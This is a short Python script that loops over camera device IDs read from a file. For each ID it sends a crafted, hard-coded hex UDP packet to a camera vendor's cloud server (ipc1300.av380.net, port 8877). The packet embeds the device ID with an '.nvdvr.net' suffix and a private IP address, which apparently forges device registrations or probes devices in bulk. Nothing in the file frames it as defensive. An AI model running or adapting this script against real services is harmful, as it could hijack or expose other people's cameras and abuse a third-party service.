import socket
import threading

print_lock = threading.Lock()


class server:
    SERVER = 'ipc1300.av380.net'
    PORT = 8877
    ThreadCount = 0
    FileListCams = "cams.txt"
    CamsList = None

    def __init__(self):
        self.CamList(self.FileListCams)
        try:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for dev in self.CamsList:
                self.CreateSocket(dev)
            result = (self.s.recvfrom(4096, 0))[0]
            print(f'Received response from server: {result}')  # debugging

        except socket.error as e:
            print("socket creation failed with error %s" % (e))

    def CamList(self, fe):
        try:
            with open(fe) as f:
                self.CamsList = [line.rstrip() for line in f]
        except IOError as e:
            print(e)
        except:
            print("Fiddlesticks! Failed")

    def CreateSocket(self, dev):
        print("Socket successfully created")
        data = '02070032303038333131323334333734313100020c17222d0000'
        data += bytes(dev, 'utf-8').hex()
        data += '2e6e766476722e6e65740000000000000000000000000000'
        data += '3131313131313131313131318a1bc0a801096762230a93f5d100'
        print(data)
        data = bytes.fromhex(data)
        result = self.send_data(data)
        print(f'Response from server: {self.byte2str(result)}')

    @staticmethod
    def byte2str(s):
        return "".join(map(chr, s))

    def send_data(self, data):
        print(f'SERVER:{self.SERVER} PORT:{self.PORT}')
        print(self.byte2str(data))
        try:
            self.s.sendto(data, (self.SERVER, self.PORT))
        except socket.error as e:
            print("socket creation failed with error %s" % (e))
        response = self.s.recvfrom(4096, 0)
        return response[0]

    def __del__(self):
        print(f"{self.__class__} FINISHED")


p = server()
